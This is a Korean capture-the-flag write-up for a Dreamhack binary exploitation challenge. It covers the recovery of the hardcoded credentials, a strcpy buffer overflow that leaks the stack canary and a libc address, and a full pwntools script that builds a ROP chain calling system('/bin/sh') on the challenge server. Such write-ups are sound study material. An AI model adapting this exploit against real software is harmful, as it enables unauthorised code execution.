ID PW
```C
if ( strncmp(s1, "Yisf", 4uLL) || strncmp(v4, "G41V6!4", 7uLL) )
    return 0LL;
```
strncmp(s1, "Yisf", 4uLL) || strncmp(v4, "G41V6!4", 7uLL)
Yisf, G41V6!4

```C
for ( dword_6FE0 = 0; dword_6FE0 <= 112; ++dword_6FE0 )
{
  read(0, &byte_6FE4, 1uLL);
  if ( byte_6FE4 == 10 )
	break;
  src[dword_6FE0] = byte_6FE4;
}
strcpy(dest, src);
```
src의 크기는 24이므로 버퍼 오버플로우가 일어남

그리고 이렇게 오버플로우가 난 후에는,
```C
printf("Name : %s\n", dest);
```
게임이 끝난 뒤 dest를 출력해주는데 위에서 strcpy했기 떄문에 릭이 가능함

바이너리 내에 딱히 쓸만한 함수가 없어서 라이브러리를 이용하고자 함
그런데

```C
BYTE2(retaddr) ^= dword_6FE8
```
RET부분(라이브러리 주소 릭이 가능함)의 일부를 랜덤값과 XOR하고 있음
CDLL로 간단하게 계산 가능

첫 게임에 카나리, 두 번째 게임에 라이브러리 베이스, 세 번째 게임에 ROP

헤멨던 것 : gdb로 열어보니 time 함수에 들어가는 값이 0x2던데 이게 NULL이랑 같은 것으로 처리되는지 몰라서 고민함 - 처음에는 아예 예측 불가능한 줄 알아서 login 과정에 얻을 수 있는 ld 값으로 구해야 하는 줄 알았다. - key가 스택에 있었다 ㅋㅋㅋ
ROP payload에 XOR 해주는 걸 까먹음. - 1시간 날림


```python
from pwn import *
from ctypes import *

p = remote('host3.dreamhack.games', 9516)
l = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
l2 = cdll.LoadLibrary('/usr/lib/x86_64-linux-gnu/libc.so.6')

def game(payload):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', payload)
    print("game")

v0 = int(l2.time(0))
l2.srand(v0)
num = int(l2.rand()) % 255

p.sendlineafter(b'[*] Id: ', b'Yisf')
p.sendlineafter(b'[*] Password: ', b'G41V6!4')
print("login")

game(b'a' * 0x19)

p.recvuntil(b'a' * 0x19)
canary = u64(b'\x00' + p.recvn(7))
print("canary : " + hex(canary))
p.sendlineafter(b'> ', b'a')

game(b'a' * 0x28)
p.recvuntil(b'a' * 0x28)
res = u64(p.recvn(6) + b'\x00' * 2)
print(hex(res))
res ^= (num << 16)
print(hex(res))
libc_base = res - (0x7ffff7d5cd90 - 0x7ffff7d33000)
print("libc_base : " + hex(libc_base))

ret = libc_base + 0x0000000000029139
pop_rdi = libc_base + 0x000000000002a3e5
system = libc_base + l.symbols['system']
binsh = libc_base + next(l.search(b'/bin/sh'))

game(b'a' * 0x18 + p64(canary) + b'b' * 8 + p64(ret ^ (num << 16)) + p64(pop_rdi) + p64(binsh) + p64(system)) 
p.recvuntil(b'Name : ')
p.sendlineafter(b'> ', b'3')

p.interactive()

```
